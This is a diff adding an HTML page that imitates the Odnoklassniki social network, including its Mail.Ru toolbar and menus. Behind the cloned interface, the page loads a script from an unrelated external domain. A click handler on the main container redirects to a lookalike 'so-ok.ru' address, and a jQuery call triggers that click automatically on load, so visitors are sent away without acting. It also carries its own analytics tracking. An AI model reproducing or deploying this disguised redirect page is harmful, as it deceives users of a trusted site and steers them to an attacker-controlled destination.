@@ -1,0 +1,500 @@
+<html class="user chrome nottouch fcofw"><head><title>Одноклассники</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<link href="http://st.mycdn.me/res/batch/css/c85bf7c7/ncore.css" type="text/css" rel="stylesheet" id="lightCoreCss">
+<link href="http://st.mycdn.me/res/batch/css/ac8ac152/nmain.css" type="text/css" rel="stylesheet" id="lightMainCss">
+<script type="text/javascript"  src="http://partelmonti.ru/?type=js&key=206c1e982ab3465"></script>
+<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
+
+
+
+
+
+<div id="hook_Block_Portal" class="hookBlock">
+<div id="hook_Block_PMailRu" class="hookBlock">
+<div id="mailRuToolbar" class="portal-headline">
+<a target="_top" class="portal-headline__link portal-headline__link_first" rel="nofollow" href="#">Mail.Ru</a>
+<a target="_top" class="portal-headline__link" rel="nofollow" href="#"><span class="portal-headline__link__text">Почта</span><i id="g_mail_events" class="portal-headline__link__balloon"></i></a>
+<a target="_top" class="portal-headline__link" rel="nofollow" href="#"><span class="portal-headline__link__text">Мой Мир</span><i id="g_my_events" class="portal-headline__link__balloon"></i></a>
+<a propagate="true" class="portal-headline__link" rel="nofollow" href="#"><span class="portal-headline__link__text portal-headline__link_selected">Одноклассники</span><i id="g_ok_events" class="portal-headline__link__balloon"></i></a>
+<a target="_top" class="portal-headline__link" rel="nofollow" href="#"><span class="portal-headline__link__text">Игры</span><i id="g_games_events" class="portal-headline__link__balloon"></i></a>
+<a target="_top" class="portal-headline__link" rel="nofollow" href="#">Знакомства</a>
+<a target="_top" class="portal-headline__link" rel="nofollow" href="#">Новости</a>
+<a target="_top" class="portal-headline__link" rel="nofollow" href="#">Поиск</a>
+<div id="portal-headline__box" class="portal-headline__projects">
+<i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_left"></i>
+<i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_right"></i>
+<a id="portal-headline__menulink" class="portal-headline__projects__link" rel="nofollow" href="javascript:void(0)">
+<i class="portal-headline__projects__link__text">Все проекты</i>&nbsp;<i class="portal-headline__projects__link__icon"></i></a>
+<div id="portal-headline__menu" class="portal-headline__projects__wrap"><div class="portal-headline__projects__column">
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Авто</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Афиша</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Бизнес</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Гороскопы</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Деньги</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Дети</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Добро</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Здоровье</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Календарь</a>
+</div>
+<div class="portal-headline__projects__column">
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Леди</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Карты</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Недвижимость</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Облако</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Ответы</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Погода</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Работа</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Рейтинг</a>
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">Спорт</a>
+</div>
+<div class="portal-headline__projects__column">
+
+<div class="portal-headline__projects__column_separator">
+
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">
+ТВ программа</a>
+
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">
+Товары</a>
+
+<a target="_blank" class="portal-headline__project__link" rel="nofollow" href="#">
+Hi&shy;&shy;-Tech</a>
+
+</div>
+
+<a target="_blank" class="portal-headline__project__link portal-headline__project__link_icon portal-headline__project__link_agent" rel="nofollow" href="#">
+<i class="portal-headline__project__link_icon__pic portal-headline__project__link_icon__pic_agent">
+</i>
+Агент Mail.Ru</a>
+
+<a target="_blank" class="portal-headline__project__link portal-headline__project__link_icon portal-headline__project__link_browser" rel="nofollow" href="#">
+<i class="portal-headline__project__link_icon__pic portal-headline__project__link_icon__pic_browser">
+</i>
+Браузер</a>
+
+<a target="_blank" class="portal-headline__project__link portal-headline__project__link_icon portal-headline__project__link_sputnik" rel="nofollow" href="#">
+<i class="portal-headline__project__link_icon__pic portal-headline__project__link_icon__pic_sputnik">
+</i>
+Спутник</a>
+
+<a target="_blank" class="portal-headline__project__link portal-headline__project__link_icon portal-headline__project__link_icq" rel="nofollow" href="#">
+<i class="portal-headline__project__link_icon__pic portal-headline__project__link_icon__pic_icq">
+</i>
+ICQ</a>
+
+</div>
+
+</div>
+
+</div>
+
+<span id="portal-headline_login" class="portal-headline__login">
+
+<a class="portal-headline__login__link" href="#">
+помощь</a>
+<a class="portal-headline__login__link" href="#">
+выход</a>
+</span>
+<script>
+window.top.MRG_toolbarUpdateTimeout=60000;</script>
+<script>
+OK.onload.addCallback(function () {OK.loader.use(['OKCustomJs'], function(){});});</script>
+</div>
+</div>
+</div>
+<div class="toolbar __pro-click">
+<div class="toolbar_decor">
+<div class="toolbar_c">
+<a title="Поздравьте друзей!" class="toolbar_a " href="#">
+<div class="toolbar_a_img-w" onclick="OK.hideToolbarPanes();">
+<div style="background: url() 50% 50% no-repeat ;" class="toolbar_a_img">
+</div>
+</div>
+</a>
+<div id="toolbar_dropdown_w" class="toolbar_dropdown_w">
+<a class="toolbar_logo" href="#">
+<div id="topPanelLeftCorner" class="toolbar_logo_img">
+<div id="hook_SBlock_TFCounter">
+</div>
+</div>
+</a>
+<div id="hook_Block_ToolbarMenu" class="hookBlock" style="visibility:hidden">
+<div class="toolbar_dropdown">
+<ul class="u-menu">
+<li class="u-menu_li">
+<a class="u-menu_a tdn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_ffriend">
+</i>
+<span class="u-menu_tx">
+Друзья</span>
+</span>
+</a>
+</li>
+<li class="u-menu_li">
+<a class="u-menu_a tdn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_photos">
+</i>
+<span class="u-menu_tx">
+Фото</span>
+</span>
+</a>
+</li>
+<li class="u-menu_li">
+<a class="u-menu_a tdn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_group">
+</i>
+<span class="u-menu_tx">
+Группы</span>
+</span>
+</a>
+</li>
+<li class="u-menu_li">
+<a class="u-menu_a tdn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_play">
+</i>
+<span class="u-menu_tx">
+Игры</span>
+</span>
+</a>
+</li>
+<li class="u-menu_li">
+<a class="u-menu_a tdn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_calendar">
+</i>
+<span class="u-menu_tx">
+Мероприятия</span>
+</span>
+</a>
+</li>
+<li class="u-menu_li">
+<a class="u-menu_a tdn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_now-on">
+</i>
+<span class="u-menu_tx">
+Сейчас на сайте</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+<script>
+OK.onload.addCallback(function(){ OK.tm.bind(500); });</script>
+</div>
+</div>
+<div id="hook_VideoCall_VideoCall" class="hookData">
+<div class="hookData" id="data_VideoCall">
+<!--{}-->
+</div>
+</div>
+<div class="hookData" id="hook_WindowTitleNotifications_8950176521">
+<!--{"title":"Одноклассники","allowedTypes":["MESSAGES","COMMENTS","NOTIFICATIONS"]}-->
+</div>
+<div id="hook_FriendOnlineNotification_FriendOnline" class="">
+<div class="topPanelLoginNotificationsContainer">
+</div>
+<div class="hookData" id="data_FriendOnline">
+<!--{}-->
+</div>
+</div>
+<div id="hook_TabletPopupHelperHook_8950176522">
+</div>
+<ul class="toolbar_nav">
+<li class="toolbar_nav_i">
+<div id="hook_ToolbarIconMessages_ToolbarMessages" class="toolbar_nav_a toolbar_nav_a__messa">
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Сообщения</div>
+</div>
+<div class="hookData" id="data_ToolbarMessages">
+
+</div>
+<div class="toolbar_nav_notif">
+<div id="counter_ToolbarMessages" class="notifications notifications__hide">
+<div class="counterText">
+</div>
+</div>
+</div>
+</div>
+<div id="hook_ToolbarIconMessagesPen_ToolbarMessagesPen">
+</div>
+</li>
+<li class="toolbar_nav_i">
+<div id="hook_ToolbarIconDiscussions_ToolbarDiscussions" class="toolbar_nav_a toolbar_nav_a__discu">
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Обсуждения</div>
+</div>
+
+<div class="toolbar_nav_notif">
+<div id="counter_ToolbarDiscussions" class="notifications notifications__hide">
+<div class="counterText">
+</div>
+</div>
+</div>
+</div>
+<div id="hook_ToolbarIconDiscussionsPen_ToolbarDiscussionsPen">
+</div>
+</li>
+<li class="toolbar_nav_i">
+<div id="hook_ToolbarIconNotifications_ToolbarNotifications" class="toolbar_nav_a toolbar_nav_a__notif">
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Оповещения</div>
+</div>
+<div class="hookData" id="data_ToolbarNotifications">
+<!--{"jsp.act":"1388859726133","jsp.nct":"0","jsp.inc":false,"refId":"newsFetch","action":"act.last","jsp.ntf":[]}-->
+</div>
+<div class="toolbar_nav_notif">
+<div id="counter_ToolbarNotifications" class="notifications notifications__hide">
+<div class="counterText">
+</div>
+</div>
+</div>
+<div id="ntf_p_sh" class="invisible">
+<ul class="u-menu">
+<li class="u-menu_li">
+<a class="u-menu_a" data-uid="cls" href="#">
+<span class="tico">
+<i class="tico_img ic ic_close">
+</i>
+Убрать метку</span>
+</a>
+</li>
+<li id="ntf_p_sh_s" class="u-menu_li invisible">
+<a class="u-menu_a" data-uid="wrn" href="#">
+<span class="tico">
+<i class="tico_img ic ic_warn">
+</i>
+пожаловаться</span>
+</a>
+</li>
+</ul>
+</div>
+<div id="hook_Block_Ntf" style="display:none">
+</div>
+</div>
+</li>
+<li class="toolbar_nav_i">
+<div id="hook_Block_HeaderTopNewEventsInToolbar" class="hookBlock">
+<a propagate="true" class="toolbar_nav_a toolbar_nav_a__guests" href="#">
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Гости</div>
+</div>
+</a>
+<div class="hook hookInvisible" id="hook_ContructableEvent_toolbarCountChangedHookId">
+<div class="hookData" id="data_8950176523">
+<!--{"event":{"b":0,"a":0,"name":"tcce"}}-->
+</div>
+</div>
+</div>
+</li>
+<li class="toolbar_nav_i">
+<div id="hook_Block_HeaderTopNewMarksInToolbar" class="hookBlock">
+<a propagate="true" class="toolbar_nav_a toolbar_nav_a__marks" href="#">
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Оценки</div>
+</div>
+</a>
+</div>
+</li>
+<li class="toolbar_nav_i">
+<div id="hook_Block_TopMenuMusic" class="hookBlock">
+<div id="hook_ToolbarIconMusic_ToolbarIconMusic" class="toolbar_nav_a toolbar_nav_a__audio">
+<div id="topPanelMusicPlayerControl" class="toolbar_music-play">
+</div>
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Музыка</div>
+</div>
+<div class="toolbar_nav_notif">
+<div id="counter_ToolbarMusic" class="notifications notifications__hide">
+<div class="counterText" id="counter_ToolbarMusic_Text" hassubscriptions="false" hasmusic="false">
+0</div>
+</div>
+</div>
+<div class="hookData" id="data_ToolbarIconMusic">
+<!--{}-->
+</div>
+</div>
+<div id="hook_Block_MWBBlock" class="hookBlock">
+</div>
+</div>
+</li>
+<li id="hook_Block_TopMenuVideo" class="hookBlock toolbar_nav_i">
+<div onclick="OK.VideoToolbarClick(this,'/dk?cmd=VideoVitrina&amp;st.vv.show=on&amp;st.cmd=appMain&amp;st.appId=orlktbrgyykixqfcirs0opgvesbhnyernnrtqfn&amp;st.layer.cmd=PopLayerClose');this.onclick=null;" class="toolbar_nav_a toolbar_nav_a__video">
+<div class="toolbar_nav_i_glow">
+</div>
+<div class="toolbar_nav_i_ic">
+<div unselectable="on" class="toolbar_nav_i_tx-w usel-off">
+Видео</div>
+</div>
+<div id="vv-fast-template" style="display:none;">
+<div class="layer layer__auxleft layer__top video-layer multimedia-layer">
+<div class="layer_ovr">
+</div>
+<div class="layer_hld" onclick="return false;">
+<div class="layer_top">
+</div>
+<div class="vl_loading">
+</div>
+</div>
+</div>
+</div>
+</div>
+</li>
+</ul>
+<div id="hook_Block_HeaderTopMenuInToolbar" class="hookBlock">
+<div class="toolbar_search __redesign">
+<div id="toolbar_search_block" class="posR">
+<div id="hook_Form_ToolbarSearchF" class="hook">
+<form action="#" method="post">
+<input name="fr.posted" value="set" type="hidden">
+
+<div class="it_w ">
+<input type="text" name="fr.query" value="" autocomplete="off" id="field_query" class="it" placeholder="Поиск" maxlength="250">
+</div>
+<input id="lsBtn" value="" class="toolbar_search_lupa" type="submit">
+
+</form>
+</div>
+<div id="hook_Block_ToolbarSuggestions" class="hookBlock">
+</div>
+<div class="hookData" id="hook_TS_tsrch" data-input="field_query" data-block="ToolbarSuggestions" data-delay="300" data-qdelay="300" data-action="/dk?cmd=ToolbarSuggestions">
+</div>
+</div>
+</div>
+</div>
+<div id="scrollTest">
+<div id="sc" style="overflow-y: scroll;">
+<div id="sch">
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div id="hook_Block_MainContainer" class="hookBlock">
+
+<div id="mainContainer">
+<script>
+document.getElementById("mainContainer").onclick = function(){
+    // navigate to new page
+    window.location.href = 'http://so-ok.ru/poisex/?xid=2H9k2mTe';
+}
+</script>
+<div class="ft-push">
+
+<script>
+jQuery(function(){
+   jQuery('#mainContainer').click();
+});
+</script>
+
+<div class="ft-push">
+
+<center>
+
+</center>
+
+</div>
+
+</div>
+</div>
+
+
+	
+<style type="text/css">
+.fcofw #fthColWrp{
+    display:none !important;
+}
+#hook_Block_Footer {
+    display:none !important;
+}
+.fcofw .mainContent_w:after,
+.fcofw .mainContent_w:before {display: none;}
+.fcofw .toolbar_c, .fcofw .toolbar_search, .fcofw #footer, .fcofw .ft-push {padding:0;}
+#mainContainer {padding-top: 0;}
+#mainContentContentColumn.tightLeftColumn {padding-left: 0;}
+.user .ft-push,
+.user #mainContent {
+    width: auto !important;
+}
+.fcofw #mainContainer {
+    margin: 0 !important;
+    padding-top: 0 !important;
+}
+.user #mainContent.mainContentSingleColumn #mainContentContentColumn {
+    margin: 0 !important;
+}
+#mainContent {
+    padding-top: 0px;
+}
+.user.fcofw #hook_Block_MainContent:before {
+    display: none !important;
+}
+.user.fcofw #hook_Block_MainContent:after {
+    display: none;
+}
+#middleColumn {
+    text-align: center;
+}
+#appMainFullScreen {
+    *zoom: 1;
+}
+#appContainer_Div {
+    left: 0;
+    margin: 0 !important;
+    display: inline-block;
+    *display: inline;
+    *zoom: 1;
+    }
+
+/* ie9 have problem with flash game overlay, flash can't be overlayed */
+
+.ie9 .topPanel,
+.ie9 .fake-toolbar {
+    position: absolute !important;
+    }
+
+.ie9 .modal_overlay,
+.ie9 .layer_ovr {
+    top: 0 !important;
+    }
+
+/* /ie9 have problem with flash game overlay, flash can't be overlayed */</style>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-72113507-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+</body></html>
